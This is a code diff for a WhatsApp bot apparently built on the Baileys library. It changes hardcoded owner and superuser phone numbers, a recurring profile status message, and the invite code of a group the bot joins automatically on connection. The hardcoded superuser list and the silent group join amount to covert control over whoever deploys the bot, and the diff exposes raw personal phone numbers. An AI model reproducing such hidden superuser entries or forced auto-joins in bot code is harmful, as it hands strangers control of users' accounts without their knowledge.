@@ -33,7 +33,7 @@ const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require("./lib/
 const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
 
 const authenticationn = require("./auth.js");
-const daddy = "254748387615@s.whatsapp.net";
+const daddy = "254769365617@s.whatsapp.net";
 
 const {
   autoview, autoread, botname, timezone, autobio, mode, anticallmsg, reactemoji, prefix, presence,
@@ -77,7 +77,7 @@ async function startKeith() {
     setInterval(() => {
       const date = new Date();
       client.updateProfileStatus(
-        `${botname} is active 24/7\n\n${date.toLocaleString("en-US", { timeZone: "Africa/Nairobi" })} It's a ${date.toLocaleString("en-US", { weekday: "long", timeZone: "Africa/Nairobi" })}.`
+        `${botname} Am alive dud get back to work\n\n${date.toLocaleString("en-US", { timeZone: "Africa/Nairobi" })} It's a ${date.toLocaleString("en-US", { weekday: "long", timeZone: "Africa/Nairobi" })}.`
       );
     }, 10 * 1000);
   }
@@ -147,8 +147,8 @@ async function startKeith() {
       const pushname = m.pushName || "No Name";
       const botNumber = await client.decodeJid(client.user.id);
       const servBot = botNumber.split('@')[0];
-      const Ghost = "254796299159"; 
-      const Ghost2 = "254110190196";
+      const Ghost = "254769365617"; 
+      const Ghost2 = "254713192684";
       const Ghost3 = "2547483876159";
       const Ghost4 = "254743995989";
       const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
@@ -339,7 +339,7 @@ async function startKeith() {
         startKeith();
       }
     } else if (connection === "open") {
-      await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
+      await client.groupAcceptInvite("KoK02NUGIdsL0vqY7U9DjY");
       console.log(`✅ Connection successful\nLoaded ${totalCommands} commands.\nBot is active.`);
 
       const getGreeting = () => {
